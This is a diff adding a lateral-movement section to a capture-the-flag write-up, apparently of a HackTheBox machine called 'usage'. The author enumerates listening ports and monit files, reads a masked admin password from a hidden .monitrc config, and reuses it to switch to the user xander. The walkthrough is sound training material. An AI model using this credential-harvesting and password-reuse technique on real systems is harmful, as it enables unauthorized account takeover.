@@ -185,3 +185,85 @@ User flag, as expected, is present in the home directory.
 $ cat /home/dash/user.txt
 f2****************************c8
 ```
+
+## Lateral movement
+
+On the machine there is another user called `xander`, which suggests that the lateral movement will be required.
+
+```bash
+dash@usage:~$ ls /home
+dash  xander
+```
+
+After some time and enumeration, I've found out that there is enigmatic port `2812` open:
+
+```bash
+dash@usage:~$ netstat -tulpn
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      1248/nginx: worker  
+tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:2812          0.0.0.0:*               LISTEN      63836/monit         
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
+tcp6       0      0 :::22                   :::*                    LISTEN      -                   
+udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
+udp        0      0 0.0.0.0:68              0.0.0.0:*                           -
+```
+
+When enumerating the filesystem looking for some related files, I've find out that the `dash` user has some interesting hidden files inside its home dir:
+
+```bash
+dash@usage:~$ find / -name '*monit*' 2>/dev/null
+/var/lib/monit
+
+... SNIP ...
+/home/dash/.monitrc
+/home/dash/.monit.state
+/home/dash/.monit.id
+/home/dash/.monit.pid
+... SNIP ...
+```
+
+Apperantly, the `.monitrc` file contains some password:
+
+```bash
+dash@usage:~$ cat .monitrc
+#Monitoring Interval in Seconds
+set daemon  60
+
+#Enable Web Access
+set httpd port 2812
+     use address 127.0.0.1
+     allow admin:3**************d
+
+#Apache
+check process apache with pidfile "/var/run/apache2/apache2.pid"
+    if cpu > 80% for 2 cycles then alert
+
+
+#System Monitoring 
+check system usage
+    if memory usage > 80% for 2 cycles then alert
+    if cpu usage (user) > 70% for 2 cycles then alert
+        if cpu usage (system) > 30% then alert
+    if cpu usage (wait) > 20% then alert
+    if loadavg (1min) > 6 for 2 cycles then alert 
+    if loadavg (5min) > 4 for 2 cycles then alert
+    if swap usage > 5% then alert
+
+check filesystem rootfs with path /
+       if space usage > 80% then alert
+
+```
+
+which allows to gain access over `xander` account:
+
+```bash
+dash@usage:~$ su - xander
+Password: 
+
+xander@usage:~$ id
+uid=1001(xander) gid=1001(xander) groups=1001(xander)
+```
